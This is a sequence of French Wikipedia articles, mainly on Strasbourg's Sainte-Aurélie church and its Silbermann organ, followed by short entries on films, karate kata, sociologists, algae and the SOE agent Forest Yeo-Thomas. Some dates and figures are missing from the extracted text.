Aujourd'hui l'église se situe un peu à l'écart des grands axes, entourée d'arbres et d'immeubles qui privent l'observateur d'une vision d'ensemble, sauf en hiver à la faveur de la chute des feuilles. Elle partage sa cour avec l'école primaire Sainte-Aurélie, la plus ancienne école publique strasbourgeoise, construite entre 1843 et 1846 par Félix Fries, sur un terrain mis à disposition par la paroisse. À l'exception des fidèles, le public ne peut donc accéder à l'église que sur rendez-vous ou, quelquefois, lors des Journées européennes du patrimoine.
Histoire.
Les découvertes et les interventions archéologiques menées dans le faubourg dès le concernent principalement des vestiges funéraires datant de l'Antiquité, ainsi que de la période mérovingienne.
La date de fondation de l'église reste incertaine. Selon le chroniqueur Koenigshoven cité par l'historien Jean-Daniel Schoepflin, sceptique, son origine remonterait à sainte Aurélie, l'une des onze mille vierges, morte à Strasbourg. D'autres sources suggèrent une fondation de l'église primitive au , sur une crypte qui aurait renfermé le tombeau de sainte Aurélie.
De fait elle est citée pour la première fois en 801, sous le vocable de Saint-Maurice, alors que celui de Sainte-Aurélie n'apparaît qu'en 1324. La conviction qu'il s'agit bien de la même église s'appuie sur ce passage de la charte du établissant que « le chapitre afferme au couvent de Saint-Arbogast certaines dîmes de l'église Saint-Maurice, vulgairement dite de Sainte-Aurélie » :
[...] "decimationes seu fructus omnes decimationum ad eos et suos successores nomine ecclesie S. Mauricii extra muros Argentinenses que ecclesia vulgariter S. Aurelie nuncupatur pertinentes" [...]
D'après Schoepflin, l'église est concédée au chapitre de Saint-Thomas par l'évêque Henri II en 1219, une concession confirmée par une bulle du pape Honorius III.
En 1471 elle est incorporée au chapitre de Saint-Thomas. Elle passe à la Réforme en 1523, en même temps que le chapitre. Après le Temple-Neuf, Saint-Thomas et Saint-Nicolas, elle devient la quatrième paroisse de la confession d'Augsbourg à Strasbourg. Son premier pasteur est Symphorien Pollion (ou Pollio), qui avait d'abord prêché le protestantisme à la cathédrale. Son successeur est Martin Bucer, élu prédicateur de « l'église des jardiniers » en 1524.
La vie des paroisses protestantes strasbourgeoises commence à être mieux connue à partir du milieu du lorsque les registres baptismaux y sont introduits. C'est ainsi que pour l'église Sainte-Aurélie ces registres sont conservés aux Archives municipales de Strasbourg depuis l'année 1550.
Au la charpente menace de s'effondrer et la construction d'une nouvelle église s'avère nécessair. Elle est confiée aux maîtres d'œuvre ("Baumeister") Michel Hatzung et Georges Frédéric Hüttner. La première pierre est posée le , les travaux progressent assez rapidement et la nouvelle église est consacrée le . À l'exception de la sacristie de la cathédrale, plus petite, en 1744, et l'église des Récollets, détruite depuis, c'est le seul édifice cultuel important construit à Strasbourg au cours du siècle.
Pendant la Révolution française, l'église sert de magasin à fourrage. En 1805, après Austerlitz, des prisonniers et des blessés russes et autrichiens sont hébergés dans l'église qui abrite un hôpital militaire du 19 janvier au 20 juillet 1806. La guerre franco-allemande de 1870 occasionne quelques dégâts, comme en témoignent les quelques briques bouchant des impacts d'obus sur le deuxième niveau du clocher en pierre. Plusieurs tuyaux de l'orgue conçu par André Silbermann ayant également été touchés, des réparations ont été confiées aux frères Wetzel.
Le l'église est classée par les Monuments historiques.
La nef et la toiture ont fait l'objet d'une restauration en 2008.
Architecture.
À l'exception du clocher, la silhouette générale de l'édifice est celle de l'église entièrement reconstruite en 1765, les volumes de la nef l'inscrivant dans la lignée des édifices baroques.
Façades.
Orientée vers l'Est, la façade principale est surmontée d'un vaste pignon à volutes revêtu d'un crépi clair, percé de quatre œils-de-bœuf et sur lequel empiète un fronton triangulaire en pierre. Celui-ci repose sur un avant-corps en grès encadré par deux hautes fenêtres pourvues d'arrière-voussures, semblables à celles des façades latérales. Tous ces éléments sont aisément reconnaissables sur la gravure de 1865 reproduite ci-dessus, à l'exception des volutes du pignon : les pans de la toiture y sont représentés droits.
Sous le fronton s'ouvre le portail principal, lui-même surmonté d'un larmier et d'une fenêtre plus petite. Le cartouche de la clé porte cette inscription gravée dans un phylactère : « ST. AURELIA MDCCLXV ». Également surmontées de linteaux en chapeau de gendarme, les portes latérales déclinent le même motif rappelant la date de construction de la nouvelle église (1765).
Clocher.
Situé à l'Ouest, le clocher est la partie la plus ancienne de l'édifice actuel, ses trois niveaux inférieurs, de style roman, datant du . Les façades de l'étage inférieur sont crépies, à l'exception des angles en pierre taillée. Son socle présente une moulure à boudin et gorge. À l'exception d'une arcade, il reste peu de chose de l'ancien portail Ouest, aujourd'hui pourvu d'une simple porte métallique. Séparés par des bandeaux en grès, les étages comportent de petites fenêtres, mais certaines ont été bouchées.
De l'époque médiévale ne subsistent que les parties basses de la tour, où se trouve la sacristie, au Sud. Celle-ci renferme un placard qui utilise une niche creusée dans l'épaisseur du mur et dont la vieille porte comporte trois serrures. La sacristie est décorée de portraits de pasteurs peints à l'huile.
Au la tour fut surélevée d'un niveau pour y installer un beffroi doté de hautes fenêtres gothiques et dont le toit à quatre pans est couronné par un coq.
Celui-ci abrite la plus ancienne cloche datée de Strasbourg (1410), qui traversa la période révolutionnaire sans dommages. Elle pèse entre 24 et 25 "Zentner" – soit environ – et porte l'inscription latine suivante : ++IhVS+XPS+MARIA+MATHEVS+MARCVS+LVCAS+JOAS&lt;br&gt;+ANNO+DNI+M+CCCC+X+FVSA+EST+HAEC+CANPANA
Cette cloche n'était pas unique, des documents attestant l'existence de quatre cloches en 1754.
En 1794, au moment de la Terreur, le clocher fut un instant menacé de démolition, au même titre que les autres clochers de la ville, et pour commencer – dans un premier projet – l'élégante flèche ajourée de la cathédrale Notre-Dame. En effet, le Jacobin Antoine Teterel, originaire de Lyon, y voyait une insulte au principe d'Égalité cher à la Révolution et une motion avait été déposée dans ce sens, qui ne fut pas suivie d'effet.
Une dizaine d'années après la consécration de la nouvelle église, en 1776, une nouvelle horloge avait été installée par Joh. Philipp Maybaum père et fils, mais l'horloge actuelle est celle construite en 1845 par Jean-Baptiste Schwilgué, alors au faîte de sa gloire après sa réalisation de la troisième horloge astronomique de la cathédrale Notre-Dame de Strasbourg. Elle a été restaurée au début des années 2000 et c'est aujourd'hui la dernière horloge de clocher de Schwilgué encore en état de marche à Strasbourg.
Agencement intérieur.
Dimensions.
Les dimensions de l’intérieur de l’église sont les suivantes
Autel et chaire à prêcher.
Les archives de la paroisse révèlent que d'importants travaux de rénovation sont entrepris entre 1668 et 1671. Les murs extérieurs et intérieurs sont blanchis en 1668, et un menuisier nommé Hans Jakob Wildmann touche 42 florins en 1669 pour la fabrication de l'autel, alors que le tourneur sur bois Leonhard Zippel réalise gracieusement les colonnettes l'entourant. En 1670 le même Hans Jakob Wildmann reçoit 60 florins pour la réalisation de la chaire, tandis que le sculpteur sur bois Mathis Preis obtient pour son travail – qui inclut le pélican situé sous la cuve – une somme de 82 florins et 5 schillings.
Peints en blanc et or, l'autel et la chaire proviennent donc de l'ancienne église. En 1865, à l'occasion de la célébration du centenaire de l'inauguration de l'église, l'autel et la chaire sont entièrement repeints.
Tous deux sont classés au titre d'objet par les Monuments historiques le .
D'importants travaux de restauration sont menés à partir du début des années 2000 jusqu'en 2014. En même temps la configuration de l'espace est modifiée, notamment pour permettre la tenue d'événements culturels. Désormais mobile, l'autel ne se trouve plus nécessairement sous la chaire.
Autel.
L'autel rectangulaire baroque qui « tient à la fois de la table à quatre pieds et de l'autel-armoire », est doté de 16 colonnettes tournées. Sa face principale est décorée d'un crucifix et de têtes d'angelots, dont la restauration a montré la qualité de la polychromie d'origine.
L'autel, qui se trouvait sur une estrade sous la chaire, est désormais doté d'un dispositif à roulettes qui permet de le déplacer, notamment lors de concerts dans l'espace central.
Chaire.
De style cartilage, la cuve de la chaire suspendue est entourée de niches abritant les quatre Évangélistes et leurs symboles : l’ange pour Matthieu, le lion pour Marc, le taureau pour Luc, l’aigle pour Jean. Comme à l'église Saint-Guillaume de Strasbourg, elle est portée par un pélican nourrissant ses petits de son propre sang, conformément à l'iconographie chrétienne occidentale symbolisant le sacrifice du Christ.&lt;br&gt;
Les travaux contemporains de restauration ont permis à la chaire de retrouver sa polychromie d'origine et les nuances d'or et d'argent des . 
Orgues.
La présence d'un orgue dans l'ancienne église est attestée par plusieurs auteurs. Selon Vogeleis, Dietrich Wagner – lui-même facteur d'orgues – y était organiste en 1604. Quant à Lobstein, il recense 25 organistes entre 1604 et 1778, dont 13 au .
L'orgue principal est achevé le par André Silbermann, originaire de Saxe et installé à Strasbourg. À l'origine il est doté de deux claviers et dix-sept jeux. Dans l'intervalle l'instrument a fait l'objet de nombreuses transformations. Au moment de la construction de la nouvelle église en 1765, l'orgue y est transféré par le fils aîné de Silbermann, Jean-André Silbermann, qui l'avait déjà complété de 3 jeux en 1762.
Afin de l'harmoniser avec l'autel et la chaire, le buffet est peint à son tour en blanc et or en 1790, tandis qu'un décor de feuillages rehaussé d'or souligne tous les éléments sculptés. Dans l'Alsace du , un tel buffet peint reste exceptionnel.
En 1911 l'instrument est pneumatisé par Dalstein-Haerpfer, le Positif devient postiche et le nombre total de jeux est porté à 33.
C'est sur cet instrument qu'Albert Schweitzer enregistre des œuvres de Bach et César Franck pour Columbia Records en 1936.
En 1952 l'église est dotée d'un orgue mécanique neuf conçu par Ernest Muhleisen. De la réalisation de Silbermann il ne subsiste alors que le buffet et sept de ses jeux. 
En 1997 le buffet fait l'objet d'un classement au titre des Monuments historiques, la partie instrumentale à son tour en 2000. Cette double reconnaissance favorise un projet de restitution de l'orgue Silbermann à son état d'origine. Démonté en 2011, sa restauration s'achève au printemps 2015. Les parties anciennes des buffets, très altérées, en particulier toute l'ornementation, sont consolidées, les lacunes comblées. Un important travail de recherches auprès d'autres orgues de Silbermann ont été nécessaires pour reconstituer et compléter la boiserie. Tous les éléments ont ainsi pu reprendre leur place d'origine et leurs proportions initiales. Le buffet d'orgue avait subi de nombreuses transformations. Initialement en bois ciré, il avait été peint dans les tons blanc et or en 1790, mais une étude stratigraphique menée en 2002 révèle une dizaine de couches superposées. L'ensemble est remis en peinture et doré à l'or fin à 24 carats, conformément à l'état de 1718. 
L'instrument est doté d'une console et d'une mécanique neuves. Le pédalier s'inspire de celui conservé dans l'orgue de l'abbaye Saint-Étienne de Marmoutier. Tous les sommiers sont reconstitués. Trois grands soufflets cunéiformes en sapin se superposent dans le clocher situé derrière l'orgue. Ils peuvent être utilisés selon trois modes différents : tirés à la main, remplis par un ventilateur électrique ou actionnés par des robots. La tuyauterie est également restaurée, mais seuls 520 tuyaux des de 1718 (soit environ 46 %) étaient conservés. Les éléments manquants, notamment les tuyaux en bois, sont en copie stricte des anciens.
Composition de l'orgue Silbermann restauré.
Un petit orgue de chœur Positif, doté de roulettes, est construit par le facteur Alfred Wild en 2001.
Panneaux peints.
Le garde-corps des tribunes est habillé de 23 toiles peintes de format oblong, livrées en 1767 par le peintre et doreur strasbourgeois Pierre-Joseph Noël, représentant un cycle de scènes bibliques : 14 épisodes de l'Ancien Testament sur les retours de la tribune à l'Est et à l'Ouest et, au centre, 9 scènes du Nouveau Testament sur le côté Nord face à la chaire. 
Dans l'ordre, de gauche (orgue) à droite, les scènes suivantes sont représentées :
 
La teinte bleu-vert des garde-corps, caractéristique de l'atmosphère du , a été restituée. La restauration de l'ensemble, ainsi que le rafraîchissement des murs et du plafond, ont été achevés en 2014. Le plafond à adoucissement, longtemps blanc, a retrouvé les motifs au trait, de forme géométrique, visibles sur une photographie de 1900.
Plaques.
L'ameublement intérieur comporte également quelques tableaux et plaques de bronze. Le réformateur Martin Bucer y est particulièrement à l'honneur, avec notamment un médaillon à son effigie apposé à droite de la chaire, identique à celui de l'église Saint-Thomas de Strasbourg, réalisé par Johannes Riegger à partir d'une médaille frappée par Friedrich Hagenauer en 1543. À gauche de la chaire, une plaque de bronze exécutée en 1929 par le sculpteur strasbourgeois Albert Schultz (1871-1953) montre Martin Bucer prêchant devant ses fidèles.
Liste des pasteurs depuis 1709.
Au cours des travaux de restauration, la mention des pasteurs successifs a été découverte sur la cuve, dans une ouverture laissée visible sous l'escalier, à titre archéologique.

</doc>
<doc id="1872879" url="https://fr.wikipedia.org/wiki?curid=1872879" title="Willow and Wind">
Willow and Wind

 (en persan : بید و باد ; "Bid-o bād") est un film dramatique iranien sorti en 1999, écrit par Abbas Kiarostami et réalisé par Mohammad-Ali Talebi
Synopsis.
Un jeune garçon doit faire un long trajet à pied pour aller récupérer une vitre de glace plus grande de ce qu’il peut porter à l’école. Le temps est mauvais et le vent si violent qu’il est presque succombé en chemin. Mais il essaie fort et finalement il peut l’apporter à la classe où il était supposé de remplacer la vitre cassée. Une fois rendu sur place, il se trouve tout seul et personne ne lui vient en aide. La vitre de glace est fracassée en morceaux par le vent…

</doc>
<doc id="1872880" url="https://fr.wikipedia.org/wiki?curid=1872880" title="Les Traqués de l'an 2000">
Les Traqués de l'an 2000

Les Traqués de l'an 2000 ("") est un film australien réalisé par Brian Trenchard-Smith, sorti en 1982.
Synopsis.
Expédiés dans un camp de rééducation, certains citoyens considérés comme déviants vont servir de gibier dans le cadre d’une chasse à l’homme organisée par le directeur de l’établissement.

</doc>
<doc id="1872884" url="https://fr.wikipedia.org/wiki?curid=1872884" title="Les traqués de l'an 2000">
Les traqués de l'an 2000



</doc>
<doc id="1872885" url="https://fr.wikipedia.org/wiki?curid=1872885" title="Blood Camp Thatcher">
Blood Camp Thatcher



</doc>
<doc id="1872886" url="https://fr.wikipedia.org/wiki?curid=1872886" title="Bradiopsylla echidnae">
Bradiopsylla echidnae

Bradiopsylla echidnae est une espèce d'insectes siphonaptères de la famille des Pygiopsyllidae. Cet insecte est considéré . Elle parasite l'échidné à nez court. Elle peut atteindre de long.

</doc>
<doc id="1872887" url="https://fr.wikipedia.org/wiki?curid=1872887" title="Escape 2000">
Escape 2000



</doc>
<doc id="1872889" url="https://fr.wikipedia.org/wiki?curid=1872889" title="Turkey Shoot">
Turkey Shoot



</doc>
<doc id="1872893" url="https://fr.wikipedia.org/wiki?curid=1872893" title="ABC Africa">
ABC Africa

ABC Africa est un film documentaire iranien sorti en 2001, écrit et réalisé par Abbas Kiarostami.
Synopsis.
En , en Ouganda, Abbas Kiarostami et son assistant, Seifollah Samadian, sollicités par une association humanitaire, le Fida, débarquent à Kampala. Pendant une dizaine de jours, ils découvrent de nombreux enfants ayant perdu leurs parents à cause du Sida. Leur caméra témoigne d'une Afrique joyeuse malgré la souffrance et la maladie.

</doc>
<doc id="1872894" url="https://fr.wikipedia.org/wiki?curid=1872894" title="Porphyridiophyceae">
Porphyridiophyceae

Les Porphyridiophyceae sont une classe d'algues rouges unicellulaires de la sous-division des "Proteorhodophytina".
Liste des ordres.
Selon , et :

</doc>
<doc id="1872898" url="https://fr.wikipedia.org/wiki?curid=1872898" title="Porphyridiales">
Porphyridiales

Les Porphyridiales sont un ordre d'algues rouges unicellulaires de la classe des "Porphyridiophyceae".
Liste des familles.
Selon , , et :

</doc>
<doc id="1872899" url="https://fr.wikipedia.org/wiki?curid=1872899" title="Routes brésiliennes">
Routes brésiliennes



</doc>
<doc id="1872900" url="https://fr.wikipedia.org/wiki?curid=1872900" title="Kata Shotokan">
Kata Shotokan

Les "kata" Shōtōkan sont les kata de karaté pratiqués au sein de l'école Shōtōkan-ryū. Ils ont été codifiés par le fondateur du style, Gichin Funakoshi, à partir de "kata" plus anciens. 
Le style Shōtōkan comporte officiellement 26 "kata", dont cinq "kata" initiatiques (la série des Heian) et vingt-et-un "kata" supérieurs. Les plus représentatifs du style sont les cinq Heian, ainsi que Bassai Dai, Kanku Dai et Jion.
Histoire.
Comme tous les "kata" de karaté, les "kata" Shōtōkan sont les héritiers d'une généalogie ancienne, remontant probablement jusqu'à l'influence des arts martiaux chinois via le karaté né sur l'île d'Okinawa.
C'est en 1936 que les "kata" Shōtōkan sont formalisés par Gichin Funakoshi au moment où il fonde officiellement le style Shōtōkan. Il les élabore à partir de "kata" traditionnels plus anciens des styles Shorei-ryū et Shorin-ryū, lesquels constituent en quelque sorte des « ancêtres communs » qui expliquent la proximité entre les "kata" Shōtōkan et ceux d'autres styles de karaté.
À l'époque, Funakoshi entreprend de « japoniser » les noms des "kata" pour en faciliter l'adoption par les Japonais (alors qu'ils étaient auparavant étaient en okinawaïen). Cela explique que les "kata" Shōtōkan portent des noms différents des "kata" originels, contrairement à d'autres styles comme le Wadō-ryū qui ont conservé les noms anciens. Ainsi, en Shōtōkan, on utilise par exemple les noms Kanku Dai, Tekki et Gankaku au lieu des noms Kushanku, Naihanchi et Chintō.
Dans un souci de facilitation de l'enseignement du karaté, Funakoshi conserva également les cinq "kata" pédagogiques Pinan créés en 1905 par son maître Ankō Itosu, les modifiant légèrement et changeant là aussi leur nom, les renommant en Heian.
Au début du , il existe de légères variantes au sein même du style Shōtōkan, qui ont été développées par les différents disciples de Funakoshi, notamment par les maîtres Taiji Kase et Hirokazu Kanazawa.
Description.
Déroulement.
Le déroulement d'un "kata" Shōtōkan est similaire au déroulement dans les autres styles (salut, position "yoi", exécution). 
Caractéristiques.
À l'image du style Shōtōkan lui-même, les "kata" Shōtōkan travaillent des positions longues et profondes. L'accent est mis sur la stabilité, la puissance des mouvements et le renforcement des jambes. Les coups de poing sont directs et les coups de pied bas (niveau "chūdan" ou "gedan"). 
Les "kata" sont particulièrement longs, notamment les plus représentatifs du style, avec par exemple le "kata" Kanku Dai qui comporte 65 techniques.
Comme dans d'autres styles, la pratique du "kata" vise en Shōtōkan un travail de précision technique. Gichin Funakoshi exprime cette idée dans le 18ème de ses vingt préceptes :
Analyses.
On considère généralement que les "kata" Shōtōkan peuvent être classifiés en deux grandes tendances. D'une part ceux influencés par la tradition Shōrin-ryū, plutôt rapides et explosifs, et d'autre part ceux influencés par le Shōrei-ryū, qui se concentrent sur la puissance et le travail de respiration.
Le chercheur et psychiatre Clive Layton s'est intéressé aux caractéristiques des "kata" Shotokan en termes de psychomotricité. L'une de ses études montre que les mouvements offensifs (frappes, coups de pied) sont principalement exécutés par les membres droits, tandis que les défenses sont plutôt exécutées à gauche, démontrant un biais dans la latéralisation. Une autre étude constate que les mouvements de défense sont plus nombreux que les contre-attaques, tendant à renforcer l'idée que le karaté repose sur une philosophie de self-defense et de non-violence.
"Kata" initiatiques.
Le Shōtōkan comporte officiellement cinq "kata" initiatiques rassemblés dans la série des Heian. On enseigne cependant parfois aussi les "kata" Taikyoku, versions simplifiées qui ne sont toutefois pas toujours reconnus officiellement dans le style. Ces deux séries de "kata" ont été créés au début du dans un but pédagogique.
Taikyoku.
Les Taikyoku sont des "kata" simplifiés. Ils sont généralement enseignés aux jeunes enfants pour les initier à la pratique du "kata".
Il existe trois "kata" Taikyoku :
Heian.
Les "kata" Heian (« paix et tranquillité » en japonais) sont les cinq "kata" fondateurs du style Shōtōkan. Ces "kata" dits éducatifs comprennent la plupart des techniques de base.
En France, l'apprentissage des cinq Heian est généralement associé au passage des cinq ceintures de couleur (jaune, orange, vert, bleu, marron).
Il existe cinq "kata" Heian :
"Kata" supérieurs.
Les "kata" supérieurs sont les "kata" historiques hérités du karaté okinawaien, souvent eux-mêmes issus de "kata" d'origine chinoise et pratiqués à l'origine dans une logique martiale. Aujourd'hui, ils sont essentiellement pratiqués par les karatékas avancés (à partir du 1er dan).
Tekki.
Les Tekki sont une série de trois "kata" supérieurs dont le nom signifie « monter à cheval ». Ils se démarquent par leur "embusen" très particulier, entièrement rectiligne, ainsi que par leur unique posture, le "kiba-dachi" (posture du cavalier). 
Il y a trois "kata" Tekki :
Bassai.
Bassai est une série de "kata" dont le nom signifie « traverser la forteresse ». La paternité du "kata" est généralement attribuée au maître Kōkan Oyadomari, du style Omari-te. C'est cependant Ankō Itosu, de l'école Shuri-te, qui créa la distinction avec Bassai Shō.
Il y a deux "kata" Bassai :
Kanku.
Kanku signifie « regarder le ciel ». Il y a deux "kata" Kanku :
Kanku Dai est le plus long des "kata" en Shōtōkan, avec 65 mouvements.
Jion, Jiin, Jitte.
Jion, Jiin et Jitte sont trois "kata" supérieurs appartenant à une même famille provenant du style Tomari-te. Ils seraient arrivés au Japon après avoir été créés dans un temple bouddhiste chinois nommé "Jionji" (temple de Jion)"".
Empi.
Empi signifie « le vol de l'hirondelle ». Il s'agit d'un "kata" semi-respiratoire, qui utilise des techniques rares telles que le "tobi-komi" (une attaque longue du poing arrière effectuée après un bond vers l'adversaire) et le "tsukami-uke" (une saisie par crochetage du poignet).
Hangetsu.
Hangetsu signifie « demi-lune ». C'est le "kata" Shōtōkan qui comporte le plus de techniques respiratoires. Il donne son nom à la posture "hangetsu-dachi".
Gankaku, Chinte.
Gankaku (originellement nommé Chintō) et Chinte sont deux "kata" supérieurs appartenant à la même famille et inspirés style Tomari-te ainsi que du Shuri-te et du Shōrei-ryu.
Sōchin.
Sōchin signifie « la force tranquille ». Sa particularité est de s'appuyer presque exclusivement sur la position "fudo-dachi", qu'on appelle d'ailleurs parfois "sōchin-dachi".
Meikyō.
Meikyō signifie « polir le miroir ». Ce "kata" possède un saut très particulier appelé "sankaku tobi geri".
Nijūshiho.
Nijūshiho signifie « 24 pas ».
Unsū.
Unsū signifie « main en nuage ». Le "kata" comporte 37 mouvements.
Wankan.
Wankan signifie « La couronne du roi ». C'est le plus court des "kata" Shōtōkan, avec 16 mouvements.
Gojūshiho.
Gojūshiho signifie « 54 pas ». Il y a deux "kata" Gojūshiho :
"Kata" et grades.
La connaissance de certains "kata" peut être requise pour le passage de certains grades, notamment les dan (grades) associés à la ceinture noire.
"Kata" requis par la Fédération Française de Karaté.
En France, c'est la Fédération Française de Karaté qui attribue les dan via un système d'examen où le "kata" est l'une des 6 épreuves obligatoires. Les "kata" requis pour chaque grade sont les suivants :

</doc>
<doc id="1872901" url="https://fr.wikipedia.org/wiki?curid=1872901" title="La Station désertée">
La Station désertée

La Station désertée (en persan : ; "Istgah-Matrouk") est un film iranien sorti en 2002, réalisé par Alireza Raisian.
Synopsis.
Un couple part en pèlerinage.

</doc>
<doc id="1872903" url="https://fr.wikipedia.org/wiki?curid=1872903" title="Jean-Claude Chamboredon">
Jean-Claude Chamboredon

Jean-Claude Chamboredon, né le à Bandol (Var) et mort le au Pré-Saint-Gervais (Seine-Saint-Denis), est un sociologue français.
Il est l'auteur, avec Pierre Bourdieu et Jean-Claude Passeron, du "Métier de sociologue". 
Biographie.
Fils d'un ingénieur devenu comptable, lui-même ancien élève de l'École normale supérieure (promotion 1959, section Lettres) et agrégé de lettres classiques (1962), il naît le à Bandol, dans le Var.
Il est un proche collaborateur de Pierre Bourdieu dont il se distancie à partir de 1981.
Avec Jean-Claude Passeron et Bourdieu, Chamboredon écrit un ouvrage de référence ("Le Métier de sociologue", 1967), réédité en 2005 et en 2021. En plus de ses nombreux travaux personnels, il est reconnu pour avoir traduit un classique de socio-linguistique intitulé "Langage et classes sociales" du britannique Basil Bernstein (Éditions de Minuit, 1956).
De 1968 à 1988, il enseigne comme agrégé-préparateur de sociologie à l'École normale supérieure de Paris. 
Défenseur de l'enseignement des sciences sociales dans le secondaire, il participe en 1977 à la création de l'agrégation de sciences économiques et sociales et en 1982 à celle de la "khâgne S" (qui devient plus tard la "khâgne B/L"). 
En 1988, il devient directeur d'études à l'École des hautes études en sciences sociales à Marseille. 
Il est notamment le directeur de thèse de Pierre-Paul Zalio et de Stéphane Beaud. 
Il meurt le , à l'âge de 81 ans à Paris.

</doc>
<doc id="1872907" url="https://fr.wikipedia.org/wiki?curid=1872907" title="Ehrard Heiden">
Ehrard Heiden



</doc>
<doc id="1872910" url="https://fr.wikipedia.org/wiki?curid=1872910" title="Socio-linguistique">
Socio-linguistique



</doc>
<doc id="1872913" url="https://fr.wikipedia.org/wiki?curid=1872913" title="Lucky Three">
Lucky Three

 (ou "") est un court métrage documentaire italo-américain réalisé par Jem Cohen, sorti en 1997.
Ce film de onze minutes met en scène le chanteur américain Elliott Smith, qui y interprète quatre chansons avec pour seul accompagnement sa guitare acoustique. Réalisé par , il a été tourné entre le 17 et le , à Portland, dans l'Oregon. "Lucky Three" est disponible sur le fanzine video #1 du label musical on Kill Rock Stars, sorti en 1999 mais désormais épuisé.

</doc>
<doc id="1872916" url="https://fr.wikipedia.org/wiki?curid=1872916" title="Crassuloideae">
Crassuloideae

La sous-famille des Crassuloideae est une des six sous-familles de la famille des "Crassulaceae" selon la classification classique. On la reconnait grâce aux étamines des fleurs, qui sont réparties sur une seule couronne alors que les fleurs des autres sous-familles en ont deux. 
Il est communément admis par les taxonomistes "classiques" que le genre "Crassula" est le seul représentant de cette sous-famille, les genres "Dinacria", "Kalosanthes", "Pagella", "Rhopalota", "Rochea" et "Vauanthes" ayant été inclus dans le genre "Crassula".
Selon la , cette sous-famille existe toujours, mais elle comprend davantage de genres.
La taxonomie des différentes sous-familles de la famille des "Crassulaceae" a fait l'objet de nombreux remaniements.

</doc>
<doc id="1872918" url="https://fr.wikipedia.org/wiki?curid=1872918" title="Clélia Ventura">
Clélia Ventura



</doc>
<doc id="1872932" url="https://fr.wikipedia.org/wiki?curid=1872932" title="La danse des abeilles">
La danse des abeilles



</doc>
<doc id="1872933" url="https://fr.wikipedia.org/wiki?curid=1872933" title="Gisèle Sapiro">
Gisèle Sapiro

Gisèle Sapiro, née le , est une sociologue française.
Biographie.
La recherche de Gisèle Sapiro a pour objet le champ intellectuel, la circulation internationale des œuvres et des idées en ce qui concerne notamment les écrivains et la littérature.
Directrice de recherche au CNRS dont elle a reçu la médaille de bronze en 2000 et la médaille d'argent en 2021, elle est depuis 2011 directrice d'études à l'École des hautes études en sciences sociales (EHESS), et membre du Centre de sociologie européenne (CSE), devenu Centre européen de sociologie et de science politique (CESSP), dont elle a assuré la direction de 2010 à 2013. Ses travaux s'inscrivent dans la continuité de l'œuvre de Pierre Bourdieu.
Elle s'est interrogée dans plusieurs ouvrages sur la notion de responsabilité de l’écrivain.
Dans son essai "Les écrivains et la politique en France", publié en 2018, Gisèle Sapiro étudie le rôle de l'écrivain dans la société française. Au , la littérature et le journalisme permettent d'accéder à la politique. À partir de 1871, date de la création de l'école libre des sciences politiques, les fonctions politiques se professionnalisent et la littérature se politise. En 1900, avec l'affaire Dreyfus, deux camps politiques s'opposent au sein du jury pour le prix Goncourt. Avec le « Nouveau Roman », dans les années 1950, politique et littérature se dissocient. Toutefois la littérature contemporaine est un lieu de critique sociale et politique.

</doc>
<doc id="1872934" url="https://fr.wikipedia.org/wiki?curid=1872934" title="Passé">
Passé

Le passé est d'abord un concept lié au temps : il est constitué de l'ensemble des configurations successives du monde et s'oppose au futur sur une échelle des temps centrée sur le présent. L'intuition du « temps qui passe » apporte une connaissance immédiate du concept de passé — il y avait quelque chose d'effectif avant le moment présent — mais l'essence du passé semble inaccessible. Cependant, le passé peut également être considéré comme une réalité physique, ainsi que le postule la théorie de la relativité.
Le passé, et le temps en général, soulèvent des questions aporétiques complexes. De nombreuses disciplines ont le passé comme sujet d'étude : l'histoire, l'archéologie, la stratigraphie, la paléontologie, certains aspects de la biologie, de la cosmologie, etc. Grâce à la sauvegarde d'une chronologie des faits antérieurs, à leur compréhension et à ses capacités de mémorisation, l'être humain est capable de déterminer un concept du passé qui s'intègre dans une théorie de la connaissance universelle. De nombreux animaux semblent également dotés d'une intuition ou d'une compréhension du passé (comportements individuels déterminés en fonction des évènements passés, par opposition à des comportements de groupes prédéterminés et rapport à l'instinct).

</doc>
<doc id="1872942" url="https://fr.wikipedia.org/wiki?curid=1872942" title="Forest Yeo-Thomas">
Forest Yeo-Thomas

Forest Frederick Edward Yeo-Thomas, né le à Londres et mort le à Paris, fut l'un des agents secrets britanniques du Special Operations Executive (SOE) pendant la Seconde Guerre mondiale les plus actifs en France.
Affecté à la section RF du SOE, en liaison avec la France libre, il effectua trois importantes missions clandestines en France, où il fut arrêté par les Allemands et torturé.
Déporté dans les camps de concentration de Buchenwald, Gleina et Rehmsdorf, il en réchappa.
Biographie.
Premières années.
Forest Yeo-Thomas naît le , 45 Balcombe Street, dans le quartier de Marylebone à Londres. Son père, John Yeo-Thomas est un marchand de charbon, qui s'installe pendant l'enfance de Forest à Dieppe. Sa mère est Daisy Ethel Burrows.
Il suit ses études au collège de Dieppe, puis au lycée Condorcet, à Paris. De ce fait, il parle parfaitement le français et l’anglais.
Première Guerre mondiale.
En 1918, il s’engage dans l'armée américaine en déclarant être âgé de alors qu'il n'en a que 16.
Il poursuit l’action pendant la guerre russo-polonaise de 1920, en combattant les bolcheviks aux côtés des Polonais. Capturé par les Russes, il réussit à s’échapper et à éviter l’exécution.
Vie active.
Démobilisé en 1922, il devient mécanicien chez Rolls-Royce. Puis dans les années suivantes, il travaille dans une agence de voyages, dans plusieurs banques et dans une compagnie pétrolière.
En 1925, il épouse Lillian Margaret Walker à la mairie du de Paris. Une première fille, Evelyn, nait en 1927. Puis, en 1930, sa deuxième fille Lillian vient au monde. Le couple s'installe à La Garenne-Colombes.
En 1932, Yeo-Thomas est nommé directeur de la célèbre maison de couture parisienne Molyneux.
Seconde Guerre mondiale.
Mobilisation dans la RAF.
Le , il se présente à l'ambassade de Grande-Bretagne à Paris et demande à servir dans la RAF. L'attaché de l'air lui répond que l'armée ne recrute plus. Il cherche alors à s'engager dans la Légion étrangère. Mais les ordres veulent qu'on n'y prenne pas d'Anglais. Le , il est finalement accepté dans la RAF, où il est nommé interprète, avec le grade de caporal, puis sergent.
À la fin de l'année, il est convoqué au QG de l'aviation de chasse, à Stanmore. Il y rencontre Barbara Dean. Pendant la drôle de guerre, il devient agent de liaison auprès des forces françaises. Lors de l'offensive allemande en , il est affecté à la liaison avec un groupe de bombardement français au Bourget.
